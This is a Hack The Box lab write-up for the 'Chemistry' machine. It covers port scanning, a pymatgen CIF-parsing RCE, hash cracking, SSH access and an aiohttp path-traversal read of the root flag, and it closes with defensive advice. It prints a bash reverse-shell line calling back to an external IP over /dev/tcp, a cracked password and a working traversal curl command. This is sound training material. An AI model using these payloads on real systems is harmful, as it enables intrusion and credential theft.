# HTB - Chemistry

**IP Address:** `10.10.11.38`  
**OS:** Ubuntu  
**Difficulty:** Easy  
**Tags:** #Flask, #FileUpload, #PythonWerkzeug, #ReverseShell, #HashCracking, #LFI

---
## Synopsis

Chemistry is an easy Linux machine that demonstrates two vulnerabilities:  
1. A **Remote Code Execution (RCE)** in the `pymatgen` Python library (CVE-2024-23346) by uploading a malicious `.cif` file to a Flask-based **CIF Analyzer** application.  
2. A **Local File Inclusion (LFI)** in the `aiohttp` Python library (CVE-2024-23334) running internally, allowing arbitrary file reads and access to the root flag.  

The attack path involves exploiting the RCE to gain a foothold, extracting and cracking password hashes to move laterally via SSH, then abusing the LFI for privilege escalation.

---
## Skills Required

- Basic Python knowledge  
- Basic Linux command-line usage

## Skills Learned

- Python deserialization attack via `pymatgen` CIF parser  
- Arbitrary file read through `aiohttp` path traversal  
- Password hash cracking and lateral movement

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Verify if the host is alive using ICMP:

```bash
ping -c 1 10.10.11.38
```

![ping](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/ping.png)

The machine responds, confirming it is reachable.

---
### 1.2 Port Scanning

Scan all TCP ports to identify running services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.38 -oG allPorts
```

- `-p-`: Scan all ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan (stealthy and fast)  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![ping](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/allPorts.png)

Extract the open ports:

```bash
extractPorts allPorts
```

![extractPorts](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/extractPorts.png)

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -sCV -p22,5000 10.10.11.38 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format

![targeted](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/targeted.png)

**Findings:**

| Port | Service | Version/Description |
|------|---------|---------------------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) |
| 5000 | HTTP    | Werkzeug httpd 3.0.3 (Python 3.9.5) |


---
## 2. Web Enumeration

### 2.1 Basic Access

Browsing to `http://10.10.11.38:5000` reveals a Flask-based application **"Chemistry CIF Analyzer"**.

![chemistry_analyzer](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/chemistry_analyzer.png)

Tried common credentials (`admin:admin`, `root:root`, etc.) without success.:

![login_invalid_credentials](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/login_invalid_credentials.png)

Registered a new account:

![register](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/register.png)

Once logged in, the dashboard allows uploading `.cif` files — suggesting potential **file parsing vulnerabilities**.

![dashboard_upload](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/dashboard_upload.png)

---
### 2.2 Upload Functionality

The application accepts only `.cif` files and provides a sample in **here** button:

![cif_example](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/cif_example.png)

Researching CIF file parsing, we found a security advisory for `pymatgen` CIF parser:  
[GHSA-vgv8-5cpj-qj2f](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f) — **Arbitrary Code Execution** vulnerability.

We crafted a malicious `.cif` file containing a reverse shell payload:

```bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.3/9090 0>&1'
```

![rs_cif](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/rs_cif.png)

Started a listener:

```bash
nc -lnvp 9090
```

Uploaded the malicious file and clicked **view**.

![rs_uploaded](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/rs_uploaded.png)

![nc_9090](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/nc_9090.png)

Reverse shell obtained.

---
## 3. Foothold

Enumerating the system:

```bash
cat /etc/passwd
```

![etc_passwd_app](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/etc_passwd_app.png)

Only `root` and `rosa` accounts have valid shells.  

Let's navigate between system:

![ls_app](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/ls_app.png)

Inside `/instance`, found `database.db` containing password hashes:

![instance](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/instance.png)

![database](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/database.png)

Extracted the hash for `rosa`:

```
63ed86ee9f624c7b14f1d4f43dc251a5
```

Cracked using CrackStation:

![crackstation](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/crackstation.png)

**Password:** `unicorniosrosados`

SSH access as `rosa`:

```bash
ssh rosa@10.10.11.38
```

![ssh_rosa](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/ssh_rosa.png)

🏁 **User flag obtained**

---
## 4. Privilege Escalation

### 4.1 Port Forwarding

Let's see if there are any service active in rosa ssh session:

![ss_lnt](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/ss_lnt.png)

From the SSH session, internal port scanning revealed a service on `127.0.0.1:8080`.  

If we try to access the website will not be loaded:

![127001_9999_no_connection](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/127001_9999_no_connection.png)

So we need to forwarded it locally by command

```bash
ssh -L 8080:127.0.0.1:8080 rosa@10.10.11.38
```

Refresh the website:

![127001_9999](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/127001_9999.png)

---
### 4.2 Exploiting LFI in aiohttp

Accessing the local service showed an internal web application.  

This version of `aiohttp` (3.9.1) is vulnerable to **Path Traversal → Arbitrary File Read** ([CVE-2024-23334](https://nvd.nist.gov/vuln/detail/cve-2024-23334)).

```bash
curl --path-as-is http://127.0.0.1:9999
```

![curl_path_as_is](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/curl_path_as_is.png)

Let's enumerate `/etc/passwd`:

![etc_passwd](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/etc_passwd.png)

We exploited the LFI to read `/root/root.txt`:

```bash
curl --path-as-is http://127.0.0.1:8080/assets/../../../root/root.txt
```

![root_flag](GitHubv2/HackTheBox/EASY/Chemistry/screenshots/root_flag.png)

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Web Enumeration** → Found CIF file upload in Flask app.  
2. **pymatgen RCE** → Uploaded malicious `.cif` to obtain reverse shell.  
3. **Credential Harvesting** → Extracted `rosa`'s hash from SQLite DB and cracked it.  
4. **SSH Access** → Logged in as `rosa`.  
5. **Port Forwarding** → Accessed internal web app on port 8080.  
6. **aiohttp LFI** → Read `/root/root.txt` via path traversal.

---
## Defensive Recommendations

**For pymatgen RCE (CVE-2024-23346):**  
- Validate and sanitize file uploads; allow only trusted file formats.  
- Implement MIME type and magic number checks to confirm file type.  
- Process untrusted files in isolated environments (sandbox/jail).  
- Update `pymatgen` to the latest patched version.

**For aiohttp LFI (CVE-2024-23334):**  
- Update `aiohttp` to a non-vulnerable version.  
- Configure static file handlers to restrict access strictly to allowed directories.  
- Implement input validation to block `../` path traversal sequences.  
- Regularly test internal applications for common web vulnerabilities.
